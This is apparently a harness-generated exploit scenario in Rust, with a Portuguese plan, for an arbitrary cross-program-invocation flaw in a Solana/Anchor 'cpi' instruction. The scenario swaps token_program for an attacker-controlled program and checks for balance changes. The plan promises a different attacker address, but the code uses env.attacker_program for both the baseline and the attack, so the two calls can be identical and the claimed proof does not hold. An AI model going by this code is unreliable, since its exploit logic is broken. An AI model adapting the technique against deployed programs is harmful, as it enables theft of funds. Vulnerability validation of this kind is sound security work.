{
  "plan": "O baseline falhou com InstructionFallbackNotFound porque o discriminador da instrucao nao foi reconhecido. O harness gera o discriminador a partir do nome da instrucao; o nome correto e `cpi`. O problema anterior foi usar `env.program_id` como token_program no baseline, o que faz o programa invocar a si mesmo recursivamente e provavelmente falhar. Para o baseline, uso um programa valido qualquer (o proprio attacker_program, que aceita qualquer instrucao) como token_program, provando que a instrucao executa. No ataque, troco o token_program por outro programa controlado pelo atacante (endereco diferente), demonstrando que o programa invoca um programa arbitrario fornecido pelo atacante.",
  "scenario": "let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();

let source_acc = wallet(1_000_000_000);
let destination_acc = wallet(1_000_000_000);
let authority_acc = wallet(1_000_000_000);

// Programa valido usado como token_program no baseline (aceita qualquer instrucao)
let legit_program = env.attacker_program.unwrap_or_else(|| Pubkey::new_unique());
let legit_program_acc = program_account(&legit_program);

let metas_legit = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(legit_program, false),
];
let ix_legit = env.anchor_ix("cpi", &(42u64,), metas_legit);
let contas_legit = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (legit_program, legit_program_acc),
];
let r_base = env.baseline("uso legitimo da instrucao cpi", &ix_legit, &contas_legit);

if r_base.program_result == ProgramResult::Success {
    // Ataque: substitui token_program por um programa diferente controlado pelo atacante
    let attacker = env.attacker_program.unwrap_or_else(|| Pubkey::new_unique());
    let attacker_acc = program_account(&attacker);

    let metas_attack = vec![
        AccountMeta::new(source, false),
        AccountMeta::new(destination, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new_readonly(attacker, false),
    ];
    let ix_attack = env.anchor_ix("cpi", &(42u64,), metas_attack);
    let contas_attack = vec![
        (source, source_acc.clone()),
        (destination, destination_acc.clone()),
        (authority, authority_acc.clone()),
        (attacker, attacker_acc),
    ];
    let r = env.attack("token_program substituido por programa do atacante", &ix_attack, &contas_attack);

    if r.program_result == ProgramResult::Success {
        // O dano: o programa invocou um programa fornecido pelo atacante no lugar do esperado.
        // Verificamos que a conta do programa do atacante foi de fato usada como programa executavel
        // e que o estado das contas passadas pode ter sido alterado pelo programa malicioso.
        let dest_after = after(&r, &destination);
        let src_after = after(&r, &source);
        env.effect(
            "programa do atacante foi invocado como token_program e alterou o estado das contas passadas",
            dest_after.lamports() != destination_acc.lamports()
                || src_after.lamports() != source_acc.lamports(),
        );
    }
}"
}

